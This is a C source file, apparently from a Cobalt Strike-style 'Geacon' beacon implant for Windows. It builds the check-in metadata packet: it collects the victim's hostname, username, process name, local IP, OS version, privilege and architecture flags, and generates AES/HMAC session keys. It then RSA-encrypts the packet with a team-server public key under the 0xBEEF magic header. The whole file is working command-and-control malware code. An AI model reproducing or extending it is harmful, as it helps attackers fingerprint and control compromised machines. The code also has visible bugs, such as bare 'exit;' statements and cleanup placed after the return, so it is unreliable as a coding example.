#include <Winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#include "MetaData.h"
#include "Util.h"
#include "Config.h"
#pragma warning(disable:4996)
extern unsigned char AESRandaeskey[16];
extern unsigned char Hmackey[16];
extern int clientID;




MakeMetaInfoResult MakeMetaInfo() {

    unsigned char aesKey[16];
    unsigned char* Randaeskey = RandomAESKey(aesKey, sizeof(aesKey));

    unsigned char hash[SHA256_DIGEST_LENGTH];

    SHA256(Randaeskey, 16, hash);


    memcpy(AESRandaeskey, hash, 16);
    memcpy(Hmackey, hash + 16, 16);

    size_t RandaeskeyLength = sizeof(aesKey);
    // 转换为 uint8_t* 数组
    uint8_t* RandaeskeyByteData = (uint8_t*)Randaeskey;




    size_t bytesWritten;
    // 获取 ANSI 代码页的字节序列
    unsigned char* acpBytes = GetCodePageANSI(&bytesWritten);
    if (acpBytes == NULL) {
        printf("Failed to retrieve ANSI code page.\n");

    }
    // 输出 ANSI 代码页的字节序列
   /* printf("ANSI Code Page Bytes: ");
    for (size_t i = 0; i < bytesWritten; ++i) {
        printf("%02x ", acpBytes[i]);
    }
    printf("\n");*/
    // 释放分配的内存
    // 转换为 uint8_t* 数组
    uint8_t* acpByteseData = (uint8_t*)acpBytes;
    // 打印 uint8_t* 数组的内容（以十六进制形式）
    /*printf("ANSI 代码页 111: ");
    for (size_t i = 0; i < bytesWritten; ++i) {
        printf("%02X ", acpByteseData[i]);
    }
    printf("\n");*/






    size_t bytesWritten1;
    // 获取 OEM 代码页的字节序列
    unsigned char* oemcpBytes = GetCodePageOEM(&bytesWritten1);
    if (oemcpBytes == NULL) {
        printf("Failed to retrieve OEM code page.\n");
        return;
    }
    // 输出 OEM 代码页的字节序列
   /* printf("OEM Code Page Bytes: ");
    for (size_t i = 0; i < bytesWritten1; ++i) {
        printf("%02x ", oemcpBytes[i]);
    }
    printf("\n");*/
    // 释放分配的内存
    uint8_t* oemcpBytesData = (uint8_t*)oemcpBytes;
    // 打印 uint8_t* 数组的内容（以十六进制形式）
   /* printf("acpByteseData to uint8_t: ");
    for (size_t i = 0; i < bytesWritten1; ++i) {
        printf("%02X ", acpByteseData[i]);
    }
    printf("\n");*/


    uint8_t clientIDBytes[4];
    clientID = GenerateEvenRandomInt(100000, 999998);
    if (clientID % 2 == 0) {
        clientID = clientID;
    }
    else
    {
        clientID = clientID + 1;
    }
    //printf("Generated Geacon ID: %d\n", clientID);
    PutUint32BigEndian(clientIDBytes, (uint32_t)clientID);
    //printf("ClientID in Big Endian: 11111111111111111111111111111111111111111\n");
    //for (int i = 0; i < 4; ++i) {
    //    printf("%02x ", clientIDBytes[i]);
    //}
    //printf("\n");


    int processID = getpid();
    uint8_t processIDBytes[4]; // 创建一个四字节的字节数组来存储结果
    PutUint32BigEndian(processIDBytes, processID);
    /*printf("Process ID in Big Endian: ");
    for (int i = 0; i < 4; ++i) {
        printf("%02x ", processIDBytes[i]);
    }
    printf("\n");*/


    uint16_t sshPort = 0; // 假设这是你的 SSH 端口
    uint8_t sshPortBytes[2]; // 创建一个两字节的字节数组来存储结果
    PutUint16BigEndian(sshPortBytes, sshPort);
    /* printf("SSH Port in Big Endian: ");
     for (int i = 0; i < 2; ++i) {
         printf("%02x ", sshPortBytes[i]);
     }
     printf("\n");*/

    int metaDataFlag = GetMetaDataFlag();
    uint8_t flagBytes[1]; // 创建一个字节大小的数组用于存储结果
    flagBytes[0] = (uint8_t)metaDataFlag; // 将整数值转换为字节类型并存储在数组中
    //printf("Flag Byte: %02x\n", flagBytes[0]);


    unsigned char* osVersion = GetOSVersion();
    //printf("%s\n", osVersion);
    int osMajorVersion = 0, osMinorVersion = 0, osBuild = 0;
    // 解析操作系统版本信息
    sscanf_s(osVersion, "OS Version: %d.%d.%d", &osMajorVersion, &osMinorVersion, &osBuild);
    //printf("Major Version: %d\n", osMajorVersion);
    //printf("Minor Version: %d\n", osMinorVersion);
    //printf("Build Number: %d\n", osBuild);
    uint8_t osMajorVersionByte[1];
    uint8_t osMinorVersionByte[1];
    osMajorVersionByte[0] = (uint8_t)osMajorVersion;
    osMinorVersionByte[0] = (uint8_t)osMinorVersion;
    /*printf("osMajorVersionByte  ");
    for (int i = 0; i < 1; ++i) {
        printf("%02x ", osMajorVersionByte[i]);
    }
    printf("\n");
    printf("osMinorVersionByte ");*/
    /*for (int i = 0; i < 1; ++i) {
        printf("%02x ", osMinorVersionByte[i]);
    }
    printf("\n");*/

    uint8_t osBuildBytes[2]; // 创建一个两字节的字节数组来存储结果
    PutUint16BigEndian(osBuildBytes, osBuild);
    /*   printf("osBuildBytes ");
       for (int i = 0; i < 2; ++i) {
           printf("%02x ", osBuildBytes[i]);
       }
       printf("\n");*/

       // 释放动态分配的内存
    free((void*)osVersion);



    uint16_t ptrFuncAddr = 0;
    uint8_t ptrFuncAddrBytes[4]; // 创建一个四字节的字节数组来存储结果
    PutUint32BigEndian(ptrFuncAddrBytes, ptrFuncAddr);
    /* printf("ptrFuncAddr in Big Endian: ");
     for (int i = 0; i < 4; ++i) {
         printf("%02x ", ptrFuncAddrBytes[i]);
     }
     printf("\n");*/

    uint16_t ptrGMHFuncAddr = 0;
    uint8_t ptrGMHFuncAddrBytes[4]; // 创建一个四字节的字节数组来存储结果
    PutUint32BigEndian(ptrGMHFuncAddrBytes, ptrGMHFuncAddr);
    /* printf("ptrGMHFuncAddrBytes in Big Endian: ");
     for (int i = 0; i < 4; ++i) {
         printf("%02x ", ptrGMHFuncAddrBytes[i]);
     }
     printf("\n");*/

    uint16_t ptrGPAFuncAddr = 0;
    uint8_t ptrGPAFuncAddrBytes[4]; // 创建一个四字节的字节数组来存储结果
    PutUint32BigEndian(ptrGPAFuncAddrBytes, ptrGPAFuncAddr);
    /* printf("ptrGPAFuncAddr in Big Endian: ");
     for (int i = 0; i < 4; ++i) {
         printf("%02x ", ptrGPAFuncAddrBytes[i]);
     }
     printf("\n");*/


    uint32_t localIPInt = GetLocalIPInt();
    uint8_t localIPIntBytes[4];
    PutUint32BigEndian(localIPIntBytes, localIPInt);
    /*printf("localIPIntBytes: ");
    for (int i = 0; i < 4; ++i) {
        printf("%02x ", localIPIntBytes[i]);
    }
    printf("\n");*/




    char* hostName = GetComputerNameAsString();
    char* currentUser = GetUsername();
    char* processName = GetProcessName();
    size_t totalLength = strlen(hostName) + strlen(currentUser) + strlen(processName);
    char* osInfo = (char*)malloc(totalLength + 11); // 增大数组大小以容纳更多信息
    //printf("11111111%d", totalLength);
    //printf("\n");

    snprintf(osInfo, totalLength + 11, "%s\t%s\t%s", hostName, currentUser, processName);
    ;
    if (strlen(osInfo) > 56) {
        osInfo[56] = '\0';
    }
    //printf("\n");
  /*  printf("%s\n", osInfo);*/

    size_t osInfoLength = strlen(osInfo);
    // 转换为 uint8_t* 数组
    uint8_t* osInfoByteData = (uint8_t*)osInfo;
    // 打印 uint8_t* 数组的内容（以十六进制形式）
    //printf("osInfoByteData to uint8_t: ");
    //for (size_t i = 0; i < osInfoLength; ++i) {
    //    printf("%02X ", osInfoByteData[i]);
    //}
    //printf("\n");

    uint8_t MagicHead[4];
    uint8_t* magicHead = GetMagicHead(MagicHead);
    //printf("magicHead     ");
    //if (magicHead != NULL) {
    //    for (int i = 0; i < 4; ++i) {
    //        printf("%02x ", magicHead[i]);
    //    }
    //}
    //printf("\n");
    // 存储数组和它们的大小
    uint8_t* onlineInfoBytes[] = { clientIDBytes, processIDBytes, sshPortBytes,flagBytes,osMajorVersionByte,
        osMinorVersionByte,osBuildBytes,ptrFuncAddrBytes,ptrGMHFuncAddrBytes,ptrGPAFuncAddrBytes,localIPIntBytes,osInfoByteData };
    size_t sizes[] = { sizeof(clientIDBytes), sizeof(processIDBytes), sizeof(sshPortBytes), sizeof(flagBytes),
        sizeof(osMajorVersionByte), sizeof(osMinorVersionByte), sizeof(osBuildBytes), sizeof(ptrFuncAddrBytes),
        sizeof(ptrGMHFuncAddrBytes), sizeof(ptrGPAFuncAddrBytes), sizeof(localIPIntBytes),osInfoLength };
    size_t onlineInfoBytesArrays = sizeof(onlineInfoBytes) / sizeof(onlineInfoBytes[0]);

    // 连接多个字节数组
    uint8_t* onlineInfconcatenated = ConByte(onlineInfoBytes, sizes, onlineInfoBytesArrays);
    size_t totalSize = 0;
    // 计算所有 sizeof 返回值的总和
    for (size_t i = 0; i < sizeof(sizes) / sizeof(sizes[0]); ++i) {
        totalSize += sizes[i];
    }



    //if (onlineInfconcatenated != NULL) {
    //    printf("Concatenated Byte Stream: ");
    //    for (size_t i = 0; i < totalSize; ++i) {
    //        printf("%02X ", onlineInfconcatenated[i]);
    //    }
    //    printf("\n");

    //    // 释放动态分配的内存
    //}
    //else {
    //    printf("Memory allocation failed.\n");
    //}

    uint8_t* metaInfoBytes[] = { RandaeskeyByteData, acpByteseData ,oemcpBytesData ,onlineInfconcatenated };
    size_t metaInfosizes[] = { RandaeskeyLength ,bytesWritten ,bytesWritten1,totalSize };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = ConByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;
    // 计算所有 sizeof 返回值的总和
    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }
    //if (metaInfoconcatenated != NULL) {
    //    printf("metaInfoconcatenated Byte Stream: ");
    //    for (size_t i = 0; i < metaInfoSize; ++i) {
    //        printf("%02X ", metaInfoconcatenated[i]);
    //    }
    //    printf("\n");

    //    // 释放动态分配的内存
    //}
    //else {
    //    printf("Memory allocation failed.\n");
    //}
    //printf("\n");
    uint8_t bBytes[4];
    uint8_t* metalen = WriteInt(metaInfoSize, bBytes);
    //printf("metalen:");
    //for (int i = 0; i < 4; ++i) {
    //    printf("%02x ", metalen[i]);
    //}
    //printf("\n");

    uint8_t* packetToEncryptBytes[] = { magicHead, metalen , metaInfoconcatenated };
    size_t packetToEncryptsizes[] = { 4 ,4 ,metaInfoSize };
    size_t packetToEncryptsArrays = sizeof(packetToEncryptBytes) / sizeof(packetToEncryptBytes[0]);
    uint8_t* packetToEncryptconcatenated = ConByte(packetToEncryptBytes, packetToEncryptsizes, packetToEncryptsArrays);
    size_t packetToEncryptSize = 0;
    // 计算所有 sizeof 返回值的总和
    for (size_t i = 0; i < sizeof(packetToEncryptsizes) / sizeof(packetToEncryptsizes[0]); ++i) {
        packetToEncryptSize += packetToEncryptsizes[i];
    }


    if (packetToEncryptconcatenated != NULL) {


        // 释放动态分配的内存
    }
    else {
        printf("Memory allocation failed.\n");
    }
    printf("\n");
    MakeMetaInfoResult MakeMetaInfoResult;

    MakeMetaInfoResult.MakeMeta = packetToEncryptconcatenated;
    MakeMetaInfoResult.MakeMetaLen = packetToEncryptSize;

    return MakeMetaInfoResult;
    

}

EncryMetadataResult EncryMetadata() {

    //unsigned char* pub_key_str = "-----BEGIN PUBLIC KEY-----\n"
    //    "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCba6EFByEFa92FMviJ9WVjsdhCD2P9RbA5Duse\n"
    //    "kXD8KNBVn0R8ZqvUcFMNUJAmvhS3D3NoQw7cybTmtpZ9QH+UjXFRNjIIJhXEKC7pOqbzybKX8p28\n"
    //    "oOC2UIE2NeBq1a5n/PVmlaMPoUrruWxVQxeyUdB9wpG/+lk+EO6fTa5QaQIDAQAB\n"
    //    "-----END PUBLIC KEY-----\n";
    // 将公钥字符串读取为BIO对象
    BIO* bio = BIO_new_mem_buf((void*)pub_key_str, -1);
    if (bio == NULL) {
        fprintf(stderr, "Error creating BIO object\n");
    }

    // 从BIO对象中读取公钥PEM格式数据
    EVP_PKEY* evp_key = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
    if (evp_key == NULL) {
        fprintf(stderr, "Error loading EVP public key\n");
        BIO_free(bio);
    }


    // 获取公钥长度和字节数据
    int pub_key_len = i2d_PUBKEY(evp_key, NULL);
    if (pub_key_len <= 0) {
        fprintf(stderr, "Error getting public key length\n");
        EVP_PKEY_free(evp_key);
        exit;
    }

    unsigned char* pub_key_bytes = (unsigned char*)malloc(pub_key_len);
    if (pub_key_bytes == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        EVP_PKEY_free(evp_key);
        exit;
    }

    unsigned char* temp_pub_key_bytes = pub_key_bytes;
    pub_key_len = i2d_PUBKEY(evp_key, &temp_pub_key_bytes);
    if (pub_key_len <= 0) {
        fprintf(stderr, "Error getting public key data\n");
        free(pub_key_bytes);
        EVP_PKEY_free(evp_key);
        exit;
    }

    // 解析公钥数据为RSA公钥
    RSA* rsa_pub_key = EVP_PKEY_get1_RSA(evp_key);
    if (rsa_pub_key == NULL) {
        fprintf(stderr, "Error extracting RSA public key\n");
        free(pub_key_bytes);
        EVP_PKEY_free(evp_key);
        exit;
    }


    // 待加密的原始数据
    MakeMetaInfoResult MakeMetaInfoResult = MakeMetaInfo();


    uint8_t* EntryMeta = MakeMetaInfoResult.MakeMeta;

    size_t orig_data_len = MakeMetaInfoResult.MakeMetaLen;



    // 分配内存来存储加密后的数据
    unsigned char* encrypted_data = (unsigned char*)malloc(RSA_size(rsa_pub_key));
    if (encrypted_data == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        RSA_free(rsa_pub_key);
        free(pub_key_bytes);
        exit;
    }


    // 使用公钥进行 PKCS#1 v1.5 填充的加密操作
    int encrypted_len = RSA_public_encrypt(orig_data_len, EntryMeta, encrypted_data, rsa_pub_key, RSA_PKCS1_PADDING);
    if (encrypted_len == -1) {
        fprintf(stderr, "Encryption failed\n");
        free(encrypted_data);
        RSA_free(rsa_pub_key);
        exit;
    }

    // 输出加密后的数据
   /* printf("EncryMetadata Encrypted data (hex)11111111111: ");
    for (int i = 0; i < encrypted_len; ++i) {
        printf("0x%02X, ", encrypted_data[i]);
    }
    printf("%d", encrypted_len);
    printf("\n");*/

    EncryMetadataResult EncryMetadataResult;
    EncryMetadataResult.EncryMetadata = encrypted_data;
    EncryMetadataResult.EncryMetadataLen = encrypted_len;
    return EncryMetadataResult;

    // 释放内存和资源
    free(encrypted_data);
    RSA_free(rsa_pub_key);
    free(pub_key_bytes);
    BIO_free(bio);
    EVP_PKEY_free(evp_key);



}

// 模拟 IsHighPriv 函数



// 获取操作系统信息并判断是否为64位
bool IsOSX64() {
    SYSTEM_INFO systemInfo;
    GetNativeSystemInfo(&systemInfo);

    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        return true; // 64位
    }
    else {
        return false; // 非64位
    }
}

typedef NTSTATUS(WINAPI* PFN_RTLGETVERSION)(PRTL_OSVERSIONINFOW);


unsigned char* GetOSVersion() {
    wchar_t ntdll_str[] = L"ntdll.dll";
    HINSTANCE hModule = LoadLibrary(ntdll_str);
    if (hModule == NULL) {
        printf("Failed to load ntdll.dll\n");
        return NULL;
    }

    // 获取 RtlGetVersion 函数地址
    typedef NTSTATUS(WINAPI* PFN_RTLGETVERSION)(LPOSVERSIONINFOEXW);
    PFN_RTLGETVERSION pfnRtlGetVersion = (PFN_RTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
    if (pfnRtlGetVersion == NULL) {
        printf("Failed to get address of RtlGetVersion\n");
        FreeLibrary(hModule);
        return NULL;
    }

    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    // 调用 RtlGetVersion 函数获取操作系统版本信息
    NTSTATUS status = pfnRtlGetVersion(&osvi);
    if (status != 0) {
        printf("RtlGetVersion failed: %lu\n", status);
        FreeLibrary(hModule);
        return NULL;
    }

    // 释放 ntdll.dll 库句柄
    FreeLibrary(hModule);

    // 分配内存以存储 OS 版本信息的字符串
    char* osVersion = (char*)malloc(50); // Allocate enough memory for the version string
    if (osVersion != NULL) {
        // 将 OS 版本信息格式化为字符串
        sprintf_s(osVersion, 50, "OS Version: %lu.%lu.%lu", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        return osVersion;
    }
    else {
        printf("Memory allocation failed\n");
        return NULL;
    }
}

int GetMetaDataFlag() {
    int flagInt = 0;

    if (IsHighPriv()) {
        flagInt += 8;
    }

    bool isOSX64 = IsOSX64();
    if (isOSX64) {
        flagInt += 4;
    }

    bool isProcessX64 = IsProcessX64();
    if (isProcessX64) {
        flagInt += 2;
    }

    return flagInt;
}




// 模拟 IsProcessX64 函数
bool IsProcessX64() {
#if defined(_WIN64)
    return true; // 编译为64位应用
#else
    return false; // 编译为32位应用
#endif
}



uint32_t GetLocalIPInt() {
    PIP_ADAPTER_INFO pAdapterInfo;
    PIP_ADAPTER_INFO pAdapter = NULL;
    ULONG outBufLen = 0;
    DWORD ret = 0;
    uint32_t ip = 0;
    uint32_t ip16 = 0;

    outBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(outBufLen);
    if (pAdapterInfo == NULL) {
        return 0;
    }

    ret = GetAdaptersInfo(pAdapterInfo, &outBufLen);
    if (ret == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(outBufLen);
        if (pAdapterInfo == NULL) {
            return 0;
        }
        ret = GetAdaptersInfo(pAdapterInfo, &outBufLen);
    }

    if (ret != ERROR_SUCCESS) {
        free(pAdapterInfo);
        return 0;
    }

    pAdapter = pAdapterInfo;
    while (pAdapter) {
        IP_ADDR_STRING* pAddress = &(pAdapter->IpAddressList);
        while (pAddress) {
            char* ipAddress = pAddress->IpAddress.String;
            if (strncmp(ipAddress, "169.254.", 8) != 0) {
                struct in_addr addr;
                if (inet_pton(AF_INET, ipAddress, &addr) == 1) {
                    ip = ntohl(addr.s_addr);
                    
                    ip16 = ntohl(addr.s_addr) >> 16;
                    break;
                }
            }
            pAddress = pAddress->Next;
        }
        if (ip != 0 || ip16 != 0) {
            break;
        }
        pAdapter = pAdapter->Next;
    }

    free(pAdapterInfo);
   

    return (ip != 0) ? ip : ip16;
}

char* GetComputerNameAsString() {
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (!GetComputerNameW(computerName, &size)) {
        return "unknown"; // 如果获取失败，返回一个默认的字符串
    }

    // 将宽字符转换为多字节字符
    int mbLen = WideCharToMultiByte(CP_UTF8, 0, computerName, -1, NULL, 0, NULL, NULL);
    char* mbComputerName = (char*)malloc(mbLen * sizeof(char));
    if (mbComputerName == NULL) {
        return "unknown"; // 内存分配失败，返回默认字符串
    }

    WideCharToMultiByte(CP_UTF8, 0, computerName, -1, mbComputerName, mbLen, NULL, NULL);

    return mbComputerName;
}


char* GetUsername() {
    char* username;
    DWORD size = UNLEN + 1;
    username = (char*)malloc(size * sizeof(char));

    if (!GetUserNameA(username, &size)) {
        free(username);
        return "unknown";
    }

    return username;
}

char* GetProcessName() {
    char* processName;
    DWORD size = MAX_PATH;
    processName = (char*)malloc(size * sizeof(char));

    if (!GetModuleFileNameA(NULL, processName, size)) {
        free(processName);
        return "unknown";
    }

    char* result = strrchr(processName, '\\');
    if (result != NULL) {
        return result + 1;
    }

    char* backslashPos = strrchr(processName, '/');
    if (backslashPos != NULL) {
        return backslashPos + 1;
    }

    return processName;
}
unsigned char* GetCodePageANSI(size_t* bytesWritten) {
    UINT acp = GetACP();
    unsigned char* acpBytes = (unsigned char*)malloc(2 * sizeof(unsigned char));
    if (acpBytes == NULL) {
        *bytesWritten = 0;
        return NULL;
    }

    // 将 acp 转换为字节序列，并将其存储在 acpBytes 中
    acpBytes[0] = (unsigned char)(acp & 0xFF);
    acpBytes[1] = (unsigned char)((acp >> 8) & 0xFF);

    // 设置返回的字节数
    *bytesWritten = 2;

    return acpBytes;

}

unsigned char* GetCodePageOEM(size_t* bytesWritten) {
    uint32_t oemcp = GetOEMCP();

    // 创建存储 OEM 代码页的数组
    unsigned char* oemcpBytes = (unsigned char*)malloc(2 * sizeof(unsigned char));
    if (oemcpBytes == NULL) {
        *bytesWritten = 0;
        return NULL;
    }

    // 将 oemcp 转换为字节序列，并将其存储在 oemcpBytes 中
    oemcpBytes[0] = (unsigned char)(oemcp & 0xFF);
    oemcpBytes[1] = (unsigned char)((oemcp >> 8) & 0xFF);

    // 设置返回的字节数
    *bytesWritten = 2;

    return oemcpBytes;
}

uint8_t* GetMagicHead(uint8_t* MagicHead) {
    uint16_t MagicNum = 0xBEEF;

    PutUint32BigEndian(MagicHead, MagicNum);
    return MagicHead;
}